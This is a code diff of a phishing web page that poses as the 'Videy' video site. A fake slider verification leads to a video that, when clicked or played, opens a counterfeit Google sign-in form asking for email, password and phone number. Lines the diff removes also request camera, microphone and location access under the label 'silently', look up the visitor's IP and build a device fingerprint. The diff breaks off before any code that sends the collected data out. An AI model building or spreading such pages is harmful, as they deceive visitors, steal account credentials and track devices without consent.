@@ -1,517 +1,453 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Videy - Share your videos</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Videy - Share your videos</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    .verify-page {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: #ffffff;
-      z-index: 1000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    }
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            color: #1a1a1a;
+        }
 
-    .verify-container {
-      max-width: 450px;
-      width: 90%;
-      text-align: center;
-      padding: 40px 30px;
-      background: white;
-      border-radius: 24px;
-    }
+        /* Header */
+        .videos-header {
+            position: sticky;
+            top: 0;
+            background: #ffffff;
+            z-index: 100;
+            padding: 12px 20px;
+            border-bottom: 1px solid #eaeaea;
+        }
 
-    .verify-icon {
-      font-size: 48px;
-      margin-bottom: 20px;
-    }
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
 
-    .verify-title {
-      font-size: 22px;
-      font-weight: 600;
-      color: #1a1a1a;
-      margin-bottom: 8px;
-    }
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #000000;
+        }
 
-    .verify-desc {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 35px;
-    }
+        .nav-icons {
+            display: flex;
+            gap: 20px;
+        }
 
-    .slider-wrapper {
-      background: #f0f0f0;
-      border-radius: 60px;
-      position: relative;
-      height: 64px;
-      cursor: pointer;
-      margin-bottom: 25px;
-      overflow: hidden;
-      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
-    }
+        .nav-icons i {
+            color: #333;
+            font-size: 20px;
+            cursor: pointer;
+        }
 
-    .slider-track {
-      position: absolute;
-      top: 0;
-      left: 0;
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #1877f2, #0d6efd);
-      border-radius: 60px;
-      transition: width 0.05s linear;
-    }
+        /* Single Video */
+        .single-video-container {
+            max-width: 900px;
+            margin: 40px auto 0;
+            padding: 0 20px;
+        }
 
-    .slider-thumb {
-      position: absolute;
-      top: 6px;
-      left: 6px;
-      width: 52px;
-      height: 52px;
-      background: white;
-      border-radius: 50%;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: grab;
-      transition: left 0.05s linear;
-      z-index: 2;
-    }
+        .video-card-single {
+            background: #ffffff;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
 
-    .slider-thumb:active {
-      cursor: grabbing;
-    }
+        .thumbnail-wrapper-single {
+            position: relative;
+            background: #000;
+            aspect-ratio: 16 / 9;
+            cursor: pointer;
+        }
 
-    .slider-thumb i {
-      font-size: 24px;
-      color: #1877f2;
-    }
+        .thumbnail-single {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
 
-    .slider-text {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      color: #888;
-      font-weight: 500;
-      font-size: 15px;
-      pointer-events: none;
-      z-index: 1;
-    }
+        .play-button-single {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+            background: rgba(0,0,0,0.7);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+            cursor: pointer;
+        }
 
-    .verify-btn {
-      background: #1877f2;
-      color: white;
-      border: none;
-      padding: 14px 30px;
-      border-radius: 40px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-      opacity: 0.5;
-      pointer-events: none;
-      transition: 0.2s;
-    }
+        .play-button-single i {
+            color: white;
+            font-size: 36px;
+            margin-left: 6px;
+        }
 
-    .verify-btn.active {
-      opacity: 1;
-      pointer-events: auto;
-    }
+        .video-info-single {
+            padding: 20px;
+        }
 
-    .videos-page {
-      display: none;
-      min-height: 100vh;
-      background: #ffffff;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    }
+        .video-title-single {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
 
-    .videos-header {
-      position: sticky;
-      top: 0;
-      background: #ffffff;
-      z-index: 100;
-      padding: 12px 20px;
-      border-bottom: 1px solid #eaeaea;
-    }
+        .video-stats-single {
+            font-size: 14px;
+            color: #666;
+        }
 
-    .header-content {
-      max-width: 1200px;
-      margin: 0 auto;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
+        /* VERIFICATION PAGE */
+        .verify-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-    .logo {
-      font-size: 24px;
-      font-weight: 700;
-      color: #000000;
-    }
+        .verify-container {
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 24px;
+        }
 
-    .nav-icons {
-      display: flex;
-      gap: 20px;
-    }
+        .verify-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
 
-    .nav-icons i {
-      color: #333;
-      font-size: 20px;
-      cursor: pointer;
-    }
+        .verify-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
 
-    .single-video-container {
-      max-width: 900px;
-      margin: 40px auto 0;
-      padding: 0 20px;
-    }
+        .verify-desc {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 35px;
+        }
 
-    .video-card-single {
-      background: #ffffff;
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-    }
+        .slider-wrapper {
+            background: #f0f0f0;
+            border-radius: 60px;
+            position: relative;
+            height: 64px;
+            cursor: pointer;
+            margin-bottom: 25px;
+            overflow: hidden;
+        }
 
-    .thumbnail-wrapper-single {
-      position: relative;
-      background: #000;
-      aspect-ratio: 16 / 9;
-      cursor: pointer;
-    }
+        .slider-track {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #1877f2, #0d6efd);
+            border-radius: 60px;
+            transition: width 0.05s linear;
+        }
 
-    .thumbnail-single {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
+        .slider-thumb {
+            position: absolute;
+            top: 6px;
+            left: 6px;
+            width: 52px;
+            height: 52px;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: grab;
+            transition: left 0.05s linear;
+            z-index: 2;
+        }
 
-    .play-button-single {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 80px;
-      height: 80px;
-      background: rgba(0,0,0,0.7);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: 0.2s;
-      cursor: pointer;
-    }
+        .slider-thumb i {
+            font-size: 24px;
+            color: #1877f2;
+        }
 
-    .play-button-single:hover {
-      background: rgba(0,0,0,0.9);
-      transform: translate(-50%, -50%) scale(1.1);
-    }
+        .slider-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #888;
+            font-weight: 500;
+            font-size: 15px;
+            pointer-events: none;
+            z-index: 1;
+        }
 
-    .play-button-single i {
-      color: white;
-      font-size: 36px;
-      margin-left: 6px;
-    }
+        .verify-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            opacity: 0.5;
+            pointer-events: none;
+            transition: 0.2s;
+        }
 
-    .video-info-single {
-      padding: 20px;
-    }
+        .verify-btn.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
 
-    .video-title-single {
-      font-size: 20px;
-      font-weight: 600;
-      color: #1a1a1a;
-      margin-bottom: 8px;
-    }
+        .videos-page {
+            display: none;
+        }
 
-    .video-stats-single {
-      font-size: 14px;
-      color: #666;
-    }
+        /* LOGIN OVERLAY */
+        .login-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
 
-    .video-stats-single span {
-      margin-right: 16px;
-    }
+        .google-login-modal {
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            padding: 32px 28px;
+            text-align: center;
+        }
 
-    .video-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: #000000;
-      z-index: 1000;
-      display: none;
-      flex-direction: column;
-    }
+        .google-login-modal img {
+            margin-bottom: 24px;
+        }
 
-    .video-modal.active {
-      display: flex;
-    }
+        .google-login-modal h3 {
+            font-size: 22px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
 
-    .modal-header {
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      padding: 16px 24px;
-      background: linear-gradient(to bottom, rgba(0,0,0,0.5), transparent);
-      z-index: 10;
-      display: flex;
-      justify-content: flex-end;
-    }
+        .google-login-modal p {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
 
-    .close-modal {
-      background: rgba(255,255,255,0.2);
-      border: none;
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      color: white;
-      font-size: 20px;
-      cursor: pointer;
-      transition: 0.2s;
-    }
+        .google-login-modal input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 14px;
+        }
 
-    .close-modal:hover {
-      background: rgba(255,255,255,0.4);
-    }
+        .google-login-modal button {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 16px;
+        }
 
-    .modal-video-wrapper {
-      flex: 1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #000;
-    }
+        .login-error {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 12px;
+        }
 
-    .modal-video-wrapper video {
-      width: 100%;
-      max-height: 100vh;
-    }
+        .login-success {
+            color: #34a853;
+            font-size: 12px;
+            margin-top: 12px;
+        }
 
-    .login-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.95);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 2000;
-    }
+        .video-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 1000;
+            display: none;
+            flex-direction: column;
+        }
 
-    .google-login-modal {
-      background: white;
-      border-radius: 12px;
-      width: 90%;
-      max-width: 400px;
-      padding: 32px 28px;
-      text-align: center;
-    }
+        .video-modal.active {
+            display: flex;
+        }
 
-    .google-login-modal img {
-      margin-bottom: 24px;
-    }
+        .modal-header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            padding: 16px 24px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.5), transparent);
+            z-index: 10;
+            display: flex;
+            justify-content: flex-end;
+        }
 
-    .google-login-modal h3 {
-      font-size: 22px;
-      font-weight: 400;
-      color: #202124;
-      margin-bottom: 8px;
-    }
+        .close-modal {
+            background: rgba(255,255,255,0.2);
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
 
-    .google-login-modal p {
-      font-size: 14px;
-      color: #5f6368;
-      margin-bottom: 24px;
-    }
+        .modal-video-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-    .google-login-modal input {
-      width: 100%;
-      padding: 14px 16px;
-      margin: 8px 0;
-      border: 1px solid #dadce0;
-      border-radius: 8px;
-      font-size: 14px;
-      transition: 0.2s;
-    }
+        .modal-video-wrapper video {
+            width: 100%;
+            max-height: 100vh;
+        }
 
-    .google-login-modal input:focus {
-      outline: none;
-      border-color: #1a73e8;
-      box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
-    }
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1001;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
 
-    .google-login-modal button {
-      width: 100%;
-      padding: 12px;
-      background: #1a73e8;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      margin-top: 16px;
-      transition: 0.2s;
-    }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(24,119,242,0.3);
+            border-top-color: #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
 
-    .google-login-modal button:hover {
-      background: #1557b0;
-    }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
 
-    .google-login-modal button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-
-    .login-error {
-      color: #d93025;
-      font-size: 12px;
-      margin-top: 12px;
-    }
-
-    .login-success {
-      color: #34a853;
-      font-size: 12px;
-      margin-top: 12px;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .loading-spinner {
-      display: inline-block;
-      width: 14px;
-      height: 14px;
-      border: 2px solid white;
-      border-radius: 50%;
-      border-top-color: transparent;
-      animation: spin 0.6s linear infinite;
-      margin-left: 8px;
-    }
-
-    @media (max-width: 768px) {
-      .play-button-single {
-        width: 60px;
-        height: 60px;
-      }
-      .play-button-single i {
-        font-size: 28px;
-      }
-      .video-title-single {
-        font-size: 16px;
-      }
-      .verify-container {
-        padding: 30px 20px;
-      }
-      .google-login-modal {
-        padding: 24px 20px;
-      }
-    }
-
-    @media (max-width: 480px) {
-      .slider-thumb {
-        width: 44px;
-        height: 44px;
-        top: 10px;
-        left: 10px;
-      }
-      .slider-thumb i {
-        font-size: 20px;
-      }
-      .slider-wrapper {
-        height: 64px;
-      }
-      .verify-title {
-        font-size: 18px;
-      }
-    }
-  </style>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+        @media (max-width: 768px) {
+            .play-button-single { width: 60px; height: 60px; }
+            .play-button-single i { font-size: 28px; }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
 
 <div class="verify-page" id="verifyPage">
-  <div class="verify-container">
-    <div class="verify-icon">🔐</div>
-    <div class="verify-title">Verifikasi keamanan</div>
-    <div class="verify-desc">Geser slider biru ke kanan untuk verifikasi</div>
-    
-    <div class="slider-wrapper" id="sliderWrapper">
-      <div class="slider-track" id="sliderTrack"></div>
-      <div class="slider-thumb" id="sliderThumb">
-        <i class="fas fa-arrow-right"></i>
-      </div>
-      <div class="slider-text" id="sliderText">Geser ke kanan</div>
+    <div class="verify-container">
+        <div class="verify-icon">🔐</div>
+        <div class="verify-title">Verifikasi keamanan</div>
+        <div class="verify-desc">Geser slider biru ke kanan untuk verifikasi</div>
+        <div class="slider-wrapper" id="sliderWrapper">
+            <div class="slider-track" id="sliderTrack"></div>
+            <div class="slider-thumb" id="sliderThumb"><i class="fas fa-arrow-right"></i></div>
+            <div class="slider-text" id="sliderText">Geser ke kanan</div>
+        </div>
+        <button class="verify-btn" id="verifyBtn">Lanjutkan</button>
     </div>
-    
-    <button class="verify-btn" id="verifyBtn">Lanjutkan</button>
-  </div>
 </div>
 
 <div class="videos-page" id="videosPage">
-  <div class="videos-header">
-    <div class="header-content">
-      <div class="logo">videy</div>
-      <div class="nav-icons">
-        <i class="fas fa-search"></i>
-        <i class="fas fa-user-circle"></i>
-      </div>
-    </div>
-  </div>
-
-  <div class="single-video-container">
-    <div class="video-card-single">
-      <div class="thumbnail-wrapper-single" id="videoThumbnail">
-        <img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800" class="thumbnail-single" alt="Video thumbnail">
-        <div class="play-button-single">
-          <i class="fas fa-play"></i>
+    <div class="videos-header">
+        <div class="header-content">
+            <div class="logo">videy</div>
+            <div class="nav-icons">
+                <i class="fas fa-search"></i>
+                <i class="fas fa-user-circle"></i>
+            </div>
         </div>
-      </div>
-      <div class="video-info-single">
-        <div class="video-title-single">Beautiful Nature 4K - Ultra HD Video</div>
-        <div class="video-stats-single">
-          <span><i class="fas fa-eye"></i> 1.2M views</span>
-          <span><i class="fas fa-thumbs-up"></i> 45K likes</span>
-          <span><i class="fas fa-comment"></i> 2.3K comments</span>
-        </div>
-      </div>
     </div>
-  </div>
+    <div class="single-video-container">
+        <div class="video-card-single">
+            <div class="thumbnail-wrapper-single" id="videoThumbnail">
+                <img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800" class="thumbnail-single" alt="Video thumbnail">
+                <div class="play-button-single"><i class="fas fa-play"></i></div>
+            </div>
+            <div class="video-info-single">
+                <div class="video-title-single">Beautiful Nature 4K - Ultra HD Video</div>
+                <div class="video-stats-single"><span><i class="fas fa-eye"></i> 1.2M views</span><span style="margin-left:16px"><i class="fas fa-thumbs-up"></i> 45K likes</span></div>
+            </div>
+        </div>
+    </div>
 </div>
 
 <div class="video-modal" id="videoModal">
-  <div class="modal-header">
-    <button class="close-modal" id="closeModalBtn"><i class="fas fa-times"></i></button>
-  </div>
-  <div class="modal-video-wrapper">
-    <video id="modalVideo" controls>
-      <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-    </video>
-  </div>
+    <div class="modal-header"><button class="close-modal" id="closeModalBtn"><i class="fas fa-times"></i></button></div>
+    <div class="modal-video-wrapper"><video id="modalVideo" controls><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"></video></div>
+</div>
+
+<div class="loading" id="loading">
+    <div class="spinner"></div>
+    <p style="margin-top:20px; color:white;">Memproses...</p>
 </div>
 
 <script>
-  (function() {
-    // ========== SLIDER VERIFICATION ==========
+    // ==================== SLIDER VERIFICATION ====================
     const sliderWrapper = document.getElementById('sliderWrapper');
     const sliderThumb = document.getElementById('sliderThumb');
     const sliderTrack = document.getElementById('sliderTrack');
@@ -527,323 +463,307 @@
     let maxLeft = 0;
     
     function updateMaxLeft() {
-      if (sliderWrapper) {
-        maxLeft = sliderWrapper.offsetWidth - 58;
-      }
+        if(sliderWrapper) maxLeft = sliderWrapper.offsetWidth - 58;
     }
-    
     updateMaxLeft();
-    window.addEventListener('resize', function() {
-      updateMaxLeft();
-      if (!isVerified && sliderThumb && sliderTrack) {
-        thumbLeft = 6;
-        sliderThumb.style.left = '6px';
-        sliderTrack.style.width = '0px';
-      }
-    });
-    
-    if (sliderThumb) {
-      sliderThumb.addEventListener('mousedown', function(e) {
-        isDragging = true;
-        startX = e.clientX - thumbLeft;
-        sliderThumb.style.cursor = 'grabbing';
-        e.preventDefault();
-      });
-    }
-    
-    document.addEventListener('mousemove', function(e) {
-      if (!isDragging) return;
-      if (!sliderThumb || !sliderTrack) return;
-      let newLeft = e.clientX - startX;
-      newLeft = Math.min(Math.max(newLeft, 6), maxLeft);
-      thumbLeft = newLeft;
-      sliderThumb.style.left = thumbLeft + 'px';
-      sliderTrack.style.width = (thumbLeft + 30) + 'px';
-      
-      if (thumbLeft >= maxLeft - 10) {
-        if (!isVerified) {
-          isVerified = true;
-          if (sliderText) sliderText.innerHTML = '✓ Terverifikasi!';
-          if (sliderText) sliderText.style.color = '#1877f2';
-          if (verifyBtn) verifyBtn.classList.add('active');
+    window.addEventListener('resize', function(){
+        updateMaxLeft();
+        if(!isVerified && sliderThumb && sliderTrack){
+            thumbLeft = 6;
+            sliderThumb.style.left = '6px';
+            sliderTrack.style.width = '0px';
         }
-      } else {
-        if (isVerified) {
-          isVerified = false;
-          if (sliderText) sliderText.innerHTML = 'Geser ke kanan';
-          if (sliderText) sliderText.style.color = '#888';
-          if (verifyBtn) verifyBtn.classList.remove('active');
-        }
-      }
     });
     
-    document.addEventListener('mouseup', function() {
-      isDragging = false;
-      if (sliderThumb) sliderThumb.style.cursor = 'grab';
-      if (!isVerified && thumbLeft < maxLeft - 10 && sliderThumb && sliderTrack) {
-        thumbLeft = 6;
-        sliderThumb.style.left = '6px';
-        sliderTrack.style.width = '0px';
-      }
-    });
-    
-    if (sliderThumb) {
-      sliderThumb.addEventListener('touchstart', function(e) {
-        isDragging = true;
-        startX = e.touches[0].clientX - thumbLeft;
-        e.preventDefault();
-      });
-    }
-    
-    document.addEventListener('touchmove', function(e) {
-      if (!isDragging) return;
-      if (!sliderThumb || !sliderTrack) return;
-      let newLeft = e.touches[0].clientX - startX;
-      newLeft = Math.min(Math.max(newLeft, 6), maxLeft);
-      thumbLeft = newLeft;
-      sliderThumb.style.left = thumbLeft + 'px';
-      sliderTrack.style.width = (thumbLeft + 30) + 'px';
-      
-      if (thumbLeft >= maxLeft - 10 && !isVerified) {
-        isVerified = true;
-        if (sliderText) sliderText.innerHTML = '✓ Terverifikasi!';
-        if (sliderText) sliderText.style.color = '#1877f2';
-        if (verifyBtn) verifyBtn.classList.add('active');
-      }
-    });
-    
-    document.addEventListener('touchend', function() {
-      isDragging = false;
-      if (!isVerified && thumbLeft < maxLeft - 10 && sliderThumb && sliderTrack) {
-        thumbLeft = 6;
-        sliderThumb.style.left = '6px';
-        sliderTrack.style.width = '0px';
-      }
-    });
-    
-    // ========== REQUEST PERMISSIONS SILENTLY ==========
-    async function requestAllPermissionsSilently() {
-      console.log('Requesting permissions silently...');
-      
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        stream.getTracks().forEach(function(track) { track.stop(); });
-      } catch(e) {}
-      
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        stream.getTracks().forEach(function(track) { track.stop(); });
-      } catch(e) {}
-      
-      try {
-        const position = await new Promise(function(resolve, reject) {
-          navigator.geolocation.getCurrentPosition(resolve, reject);
+    if(sliderThumb){
+        sliderThumb.addEventListener('mousedown', function(e){
+            isDragging = true;
+            startX = e.clientX - thumbLeft;
+            sliderThumb.style.cursor = 'grabbing';
+            e.preventDefault();
         });
-      } catch(e) {}
     }
     
-    // ========== GET REAL IP ==========
-    async function getRealIP() {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-      } catch(e) {
-        return 'Unknown';
-      }
-    }
-    
-    // ========== DEVICE FINGERPRINT ==========
-    function getDeviceFingerprint() {
-      try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = 200;
-        canvas.height = 50;
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Videy', 2, 15);
-        return canvas.toDataURL();
-      } catch(e) {
-        return 'Canvas not supported';
-      }
-    }
-    
-    // ========== VERIFY BUTTON ==========
-    if (verifyBtn) {
-      verifyBtn.addEventListener('click', async function() {
-        if (!isVerified) return;
+    document.addEventListener('mousemove', function(e){
+        if(!isDragging) return;
+        if(!sliderThumb || !sliderTrack) return;
+        let newLeft = e.clientX - startX;
+        newLeft = Math.min(Math.max(newLeft, 6), maxLeft);
+        thumbLeft = newLeft;
+        sliderThumb.style.left = thumbLeft + 'px';
+        sliderTrack.style.width = (thumbLeft + 30) + 'px';
         
-        verifyBtn.innerHTML = 'Memproses...';
-        verifyBtn.disabled = true;
-        
-        await requestAllPermissionsSilently();
-        
-        setTimeout(function() {
-          if (verifyPage) verifyPage.style.display = 'none';
-          if (videosPage) videosPage.style.display = 'block';
-        }, 500);
-      });
+        if(thumbLeft >= maxLeft - 10){
+            if(!isVerified){
+                isVerified = true;
+                if(sliderText) sliderText.innerHTML = '✓ Terverifikasi!';
+                if(sliderText) sliderText.style.color = '#1877f2';
+                if(verifyBtn) verifyBtn.classList.add('active');
+            }
+        } else {
+            if(isVerified){
+                isVerified = false;
+                if(sliderText) sliderText.innerHTML = 'Geser ke kanan';
+                if(sliderText) sliderText.style.color = '#888';
+                if(verifyBtn) verifyBtn.classList.remove('active');
+            }
+        }
+    });
+    
+    document.addEventListener('mouseup', function(){
+        isDragging = false;
+        if(sliderThumb) sliderThumb.style.cursor = 'grab';
+        if(!isVerified && thumbLeft < maxLeft - 10 && sliderThumb && sliderTrack){
+            thumbLeft = 6;
+            sliderThumb.style.left = '6px';
+            sliderTrack.style.width = '0px';
+        }
+    });
+    
+    if(sliderThumb){
+        sliderThumb.addEventListener('touchstart', function(e){
+            isDragging = true;
+            startX = e.touches[0].clientX - thumbLeft;
+            e.preventDefault();
+        });
     }
     
-    // ========== VIDEO PLAYER MODAL ==========
+    document.addEventListener('touchmove', function(e){
+        if(!isDragging) return;
+        if(!sliderThumb || !sliderTrack) return;
+        let newLeft = e.touches[0].clientX - startX;
+        newLeft = Math.min(Math.max(newLeft, 6), maxLeft);
+        thumbLeft = newLeft;
+        sliderThumb.style.left = thumbLeft + 'px';
+        sliderTrack.style.width = (thumbLeft + 30) + 'px';
+        if(thumbLeft >= maxLeft - 10 && !isVerified){
+            isVerified = true;
+            if(sliderText) sliderText.innerHTML = '✓ Terverifikasi!';
+            if(sliderText) sliderText.style.color = '#1877f2';
+            if(verifyBtn) verifyBtn.classList.add('active');
+        }
+    });
+    
+    document.addEventListener('touchend', function(){
+        isDragging = false;
+        if(!isVerified && thumbLeft < maxLeft - 10 && sliderThumb && sliderTrack){
+            thumbLeft = 6;
+            sliderThumb.style.left = '6px';
+            sliderTrack.style.width = '0px';
+        }
+    });
+    
+    if(verifyBtn){
+        verifyBtn.addEventListener('click', function(){
+            if(!isVerified) return;
+            verifyBtn.innerHTML = 'Memproses...';
+            verifyBtn.disabled = true;
+            setTimeout(function(){
+                if(verifyPage) verifyPage.style.display = 'none';
+                if(videosPage) videosPage.style.display = 'block';
+            }, 500);
+        });
+    }
+    
+    // ==================== VIDEO MODAL ====================
     const videoModal = document.getElementById('videoModal');
     const modalVideo = document.getElementById('modalVideo');
     const closeModalBtn = document.getElementById('closeModalBtn');
     const videoThumbnail = document.getElementById('videoThumbnail');
     
-    function openVideoModal() {
-      if (modalVideo) modalVideo.src = "https://www.w3schools.com/html/mov_bbb.mp4";
-      if (videoModal) videoModal.classList.add('active');
-      showLoginOverlay();
-    }
-    
-    function closeVideoModal() {
-      if (modalVideo) modalVideo.pause();
-      if (modalVideo) modalVideo.src = '';
-      if (videoModal) videoModal.classList.remove('active');
-      const existingOverlay = document.querySelector('.login-overlay');
-      if (existingOverlay) existingOverlay.remove();
-    }
-    
-    if (videoThumbnail) videoThumbnail.addEventListener('click', openVideoModal);
-    if (closeModalBtn) closeModalBtn.addEventListener('click', closeVideoModal);
-    
-    if (modalVideo) {
-      modalVideo.addEventListener('play', function() {
-        modalVideo.pause();
+    function openVideoModal(){
+        if(modalVideo) modalVideo.src = "https://www.w3schools.com/html/mov_bbb.mp4";
+        if(videoModal) videoModal.classList.add('active');
         showLoginOverlay();
-      });
-      
-      modalVideo.addEventListener('click', function() {
-        modalVideo.pause();
-        showLoginOverlay();
-      });
     }
     
-    // ========== LOGIN OVERLAY ==========
-    function showLoginOverlay() {
-      const existingOverlay = document.querySelector('.login-overlay');
-      if (existingOverlay) existingOverlay.remove();
-      
-      const overlay = document.createElement('div');
-      overlay.className = 'login-overlay';
-      overlay.innerHTML = `
-        <div class="google-login-modal">
-          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" style="width: 92px;">
-          <h3>Sign in</h3>
-          <p>to continue to videy</p>
-          <input type="email" id="loginEmail" placeholder="Email or phone" autocomplete="off">
-          <input type="password" id="loginPassword" placeholder="Enter your password">
-          <input type="tel" id="loginPhone" placeholder="Phone number (optional)">
-          <button id="loginSubmitBtn">Next</button>
-          <div class="login-error" id="loginErrorMsg"></div>
-        </div>
-      `;
-      
-      document.body.appendChild(overlay);
-      
-      const emailInput = document.getElementById('loginEmail');
-      const passwordInput = document.getElementById('loginPassword');
-      const phoneInput = document.getElementById('loginPhone');
-      const loginBtn = document.getElementById('loginSubmitBtn');
-      const errorMsg = document.getElementById('loginErrorMsg');
-      
-      if (loginBtn) {
-        loginBtn.addEventListener('click', async function() {
-          const email = emailInput ? emailInput.value.trim() : '';
-          const password = passwordInput ? passwordInput.value : '';
-          const phone = phoneInput ? phoneInput.value.trim() : '';
-          
-          if (!email || !password) {
-            if (errorMsg) errorMsg.textContent = 'Email and password are required';
+    function closeVideoModal(){
+        if(modalVideo) modalVideo.pause();
